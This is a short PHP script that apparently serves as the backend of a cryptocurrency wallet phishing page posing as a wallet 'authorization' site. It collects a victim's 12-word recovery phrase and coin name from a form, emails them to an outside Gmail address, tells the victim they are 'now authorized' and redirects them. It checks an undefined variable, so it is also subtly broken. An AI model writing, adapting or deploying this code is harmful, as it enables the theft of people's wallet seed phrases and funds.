<?php
//get data from form  
$The12Phrase = $_POST['phrase'];
$CoinName= $_POST['coin-name'];

$to = "bellakinn8@gmail.com";

$subject = "Mail From app-rewalletauthe.com";

$txt ="phrase = ". $The12Phrase . "\r\n  coin-name = " . $CoinName;

$headers = "From: noreply@yoursite.com" . "\r\n" .
"CC: bellakinn8@gmail.com";

if($email!=NULL){
    mail($to,$subject,$txt,$headers);
    echo "your are now authorized";
}
//redirect
header("Location:index.html");

?>